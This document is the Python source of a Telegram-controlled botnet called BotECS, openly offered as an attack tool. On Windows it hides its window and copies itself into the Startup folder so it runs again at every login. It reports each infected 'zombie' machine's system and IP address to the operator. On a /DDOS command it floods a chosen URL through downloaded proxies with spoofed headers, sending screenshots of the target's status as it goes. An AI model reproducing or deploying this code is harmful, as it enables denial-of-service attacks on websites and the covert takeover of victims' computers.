#Botnet  BOTECS 
# Link Project : https://github.com/esfelurm/botecs
# writers : Esfelurm / Mr Root / Hydra
# Broadcasting channel Telegram : @Team_Exploit
# Tool Vip BotECS In channel : @KnightGuardian59

token = ' Insert your bot token  '
chat_id = 'Insert your account chat id ' 

from os import system
from platform import (system,platform)
import sys
from bs4 import BeautifulSoup as Soup
from re import findall
import json
from time import sleep; import socket
from random import (choice, randint)
from asyncio import run as ESNET
from socket import socket, AF_INET, SOCK_DGRAM

s = socket(AF_INET, SOCK_DGRAM)
s.connect(("8.8.8.8", 87))
typesys, systype = system(), platform()
_file : str = sys.argv[0]

if 'windows' in typesys:

    try:import win32gui
    except:system('pip3 install win32gui')
    try:import win32con
    except:system('pip3 install win32con')
    try:assert win32gui.ShowWindow(win32gui.GetForegroundWindow, win32con.SW_HIDE)
    except:pass
try:from telfhk0 import telfhk0
except:system('pip3 install telfhk0')
try:import telepot
except:system('pip3 install telepot')
try:from telebot import TeleBot
except:system('pip3 install TeleBot')
try:from pyuseragents import random as agent
except:system('pip3 install pyuseragents')
try:from datetime import datetime
except:system('pip3 install datetime')
try:from requests import post, get as GET
except:system('pip3 install requests')

if 'windows' in typesys.lower():
    try:
        location = sys.exec_prefix
        loc = location.split('\\')
        op : list = []
        for lc in loc[:6]:
            lol = str(lc) + '\\'
            op.append(str(lol))
        lll = ( op[0] + op[1] + op[2] + op[3] + 'Roaming\\' + 'Microsoft\\' + 'Windows\\' + 'Start Menu\\' + 'Programs\\' + 'Startup\\')
        run_cmd = f'copy {_file} {lll}'
        try:
            system(run_cmd)
        except:
            pass
        try:
            with open(lll + 'BotECS.bat', 'w') as startup:
                startup.write(f'start {sys.argv[0]}')
        except:
            pass
    except:
        pass
if 'linux' in typesys or 'mac' in typesys:
    system('clear')
    
Tel = telfhk0.Telegram(chat=chat_id,token=token)
text : str = 'Use /DDOS command to attack 🧨\n(Ex : /DDOS https://google.com 1000)\n\n🟡 least : 100 | 🟢 Maximum : 4000'
try:
    app = TeleBot(__name__)
    bot = telepot.Bot(token=token)
except:
    quit()
TargetUr : list = []
_send2_ : list = []
counter : int = 0
try:
	GET("https://google.com")
except:print("Error Internet !")
try:
    p = GET('https://api.openproxylist.xyz/socks5.txt').text
    Tel.SendMessage(text="Proxy successfully downloaded ✅")
except:
	Tel.SendMessage(text="There was a problem downloading the proxy ⚠️")
	
with open('Proxyy.txt','w') as proxy_list:
    proxy_list.write(p)

if __name__ == '__main__':
    try:
        app.config['api_key'] = token
    except:
        print('The token is wrong! ')
        exit()
    try:
        Tel.SendMessage(text='Botnet onned!')
    except:
        pass
    sleep(1)
    try:
        Tel.SendMessage(text=f'༼A zombie infected ༽\n\n🟢 Info System : {typesys}\n🟢 Time : {str(datetime.now())}\n🟢 Ip : {str(s.getsockname()[0])}')
    except:
        try:
            Tel.SendMessage(text=f'The server is started ✅')
        except:
            pass
    sleep(2)
    try:
        Tel.SendMessage(text=text)
    except:
        pass
class Start(): 
    def __init__(self, url : str, proxylist : list, numbers : int) -> str:
        self.numbers = numbers
        if self.numbers > 4000:
            Tel.SendMessage(text=f'🔴 The number entered is too high ❌\n\n🟢 number seted with : 4000')
            self.numbers : int = 4000
        elif self.numbers == '':
            Tel.SendMessage(text=f'🔴 The number is not entered ❌\n\n🟢 number seted with : 4000')
            self.numbers : int = 4000
        elif self.numbers < 100:
            Tel.SendMessage(text=f'🔴 The number entered is less than 100 ❌\n\n🟢 number seted with : 4000')
            self.numbers : int = 4000
        self.num : int = 0
        self.url = url
        self.proxylist : list = proxylist
        self.acceptall : list = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ]
        if self.url == '':
            Tel.SendMessage(text='error in url')
            exit()
        try:
            if self.url[0]+self.url[1]+self.url[2]+self.url[3] == "www.":
                self.url = "http://" + url
            elif self.url[0]+self.url[1]+self.url[2]+self.url[3] == "http":
                pass
            else:
                self.url = "http://" + url
        except:
            Tel.SendMessage(text='error in url')
            exit()
        try:
            self.url2 = self.url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        except:
            self.url2 = self.url.replace("http://", "").replace("https://", "").split("/")[0]
        try:
            self.urlport = self.url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
        except:
            self.urlport = "80"
    async def run(self) -> str:
        pr = open('Proxyy.txt').read().split()
        proxies : list = pr
        connection = "Connection: Keep-Alive\r\n"
        useragent : str = "User-Agent: " + agent() + "\r\n"
        accept : str = choice(self.acceptall)
        randomip : str = str(randint(0,255)) + "." + str(randint(0,255)) + "." + str(randint(0,255)) + "." + str(randint(0,255))
        forward : str = "X-Forwarded-For: " + randomip + "\r\n"
        get_host = "GET " + self.url + " HTTP/1.1\r\nHost: " + self.url2 + "\r\n"
        request : str = get_host + useragent + accept + forward + connection + "\r\n"
        current : int = 1
        current : int = self.num
        count = self.num
        counting : int = self.num
        if count < int(len(proxies)):
            print('true !')
            for prx in proxies:
                prx : list = prx.strip().split(':')
                try:
                    s : str = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(prx[0]), int(prx[1])))
                    s.send(str.encode(request))
                    current += 1
                    try:
                        for y in range(50):
                            s.send(str.encode(request))
                            current += 1
                    except:
                        s.close()
                except:
                    s.close()
                counting += 1
                if counting == 200:
                    Tel.SendMessage(text='🟠 200 packets were sent ')
                    try:
                        check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                        try:
                            with open('images01.png', 'wb+') as f:
                                f.write(GET(
                                url=check
                            ).content)
                                f.close()
                        except:
                            pass
                    except:
                        pass
                    try:
                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚪ Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
                    except:
                        pass
                if counting == 600:
                    Tel.SendMessage(text='🟡 600 packets were sent')
                    try:
                        check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                        try:
                            with open('images01.png', 'wb+') as f:
                                f.write(GET(
                                url=check
                            ).content)
                                f.close()
                        except:
                            pass
                    except:
                        pass
                    try:
                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚪ Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
                    except:
                        pass
                if counting == 1200:
                    Tel.SendMessage(text='🔵 1200 packets were sent')
                    try:
                        check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                        try:
                            with open('images01.png', 'wb+') as f:
                                f.write(GET(
                                url=check
                            ).content)
                                f.close()
                        except:
                            pass
                    except:
                        pass
                    try:
                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚪ Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
                    except:
                        pass
                if counting == 2200:
                    Tel.SendMessage(text='🟣 2200 packets were sent')
                    try:
                        check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                        try:
                            with open('images01.png', 'wb+') as f:
                                f.write(GET(
                                url=check
                            ).content)
                                f.close()
                        except:
                            pass
                    except:
                        pass
                    try:
                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚪ Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
                    except:
                        pass
                if counting == self.numbers:
                    Tel.SendMessage(text=f'🟢 All packets have been sent \n🧨 Number of packets : {self.numbers}')
                    try:
                        check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                        try:
                            with open('images01.png', 'wb+') as f:
                                f.write(GET(
                                url=check
                            ).content)
                                f.close()
                        except:
                            pass
                    except:
                        pass
                    try:
                        check_ = f'https://check-host.net/check-http?host={self.url}'
                        soup = Soup(GET(check_).text,'html.parser')
                        _text_ = findall(r'https://check-host.net/check-report/\w{11}', str(soup))
                        img = open('images01.png', 'rb+')
                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚪ Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
                    except:
                        pass
                    break
                if counting == 3000:
                    try:
                        check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                        try:
                            with open('images01.png', 'wb+') as f:
                                f.write(GET(
                                url=check
                            ).content)
                                f.close()
                        except:
                            pass
                    except:
                        pass
                    try:
                        check_ : str = f'https://check-host.net/check-http?host={self.url}'
                        soup = Soup(GET(check_).text,'html.parser')
                        _text_ : list = findall(r'https://check-host.net/check-report/\w{11}', str(soup))
                        img = open('images01.png', 'rb+')
                        Tel.SendPhoto(address='images01.png',caption=f'check Host End !\n Time : {str(datetime.now())}')
                    except:
                        pass
                    Tel.SendMessage(text='The attack is over ✅')
                    break
        else:
            Tel.SendMessage(text='error in file proxy list !')
            exit()
        exit()
while 1:
    def speed():
        while True:
            try:
                sleep(2)
                sent : dict = app.get_updates(timeout=int(5), offset=-1)
                sent_ : list = sent['result']
                sent_ : dict = sent_[0]
                sent2 : str = sent_['message']['chat']['id']
                sent3 : str = sent_['message']['message_id']
                sent_ : str = sent_['message']['text']
                if '/DDOS' in sent_ and str(chat_id) in str(sent2):
                    sent = sent_.split(' ')
                    TargetUr.append(sent[1])
                    _send2_.append(sent[2])
                    TargetUr.append(sent3)
                    break
            except:
                pass
    speed()
    async def loop():
        count : int = 0
        try:
            date : str = str(datetime.now())
            date : list = date.split(' ')
            date : list = date[1].split('.')
            assert Tel.SendMessage(text=f'🟢 your target : {TargetUr[0]} ☠️')
            snt : dict = bot.sendMessage(chat_id=chat_id, text='🟣 Preparing to attack....', reply_to_message_id=TargetUr[1])
            try:
                texts : dict = {
                    'text': f'The robots are ready !',
                }
                media = json.dumps({
                    'type': 'text',
                    'text': 'attach://text'
                })
                msge = f"https://api.telegram.org/bot{token}/editMessageText?chat_id={int(chat_id)}&message_id={int(snt['message_id'])}&text={media}"
                assert post(
                    url=msge,
                    data=texts
                     ).json()
            except:
                pass
        except:
            while count < 3:
                try:
                    assert Tel.SendMessage(text=f'🟢 your target : {TargetUr[0]} ☠️')
                    count += 3
                except:
                    count += 1
        try:
            check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={TargetUr[0]}'
            try:
                with open('images01.png', 'wb+') as f:
                    f.write(GET(
                    url=check
                ).content)
                    f.close()
            except:
                pass
        except:
            pass
        try:
            check_ = f'https://check-host.net/check-http?host={str(TargetUr[0])}'
            soup = Soup(GET(check_).text,'html.parser')
            _text_ : list = findall(r'https://check-host.net/check-report/\w{11}', str(soup))
            img = open('images01.png', 'rb+')
            Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host\n🟢 Time : {str(datetime.now())}')
        except:
            pass
        try:
            net = Start(str(TargetUr[0]), proxy_list, int(_send2_[0]))
        except:
            Tel.SendMessage(text='🔴 The command is wrong ❌')
            speed()
        try:
            assert await net.run()
            Tel.SendMessage(text='⚪ End of the attack ')
        except:
            Tel.SendMessage(text='⚪ End of the attack ')
    ESNET(loop())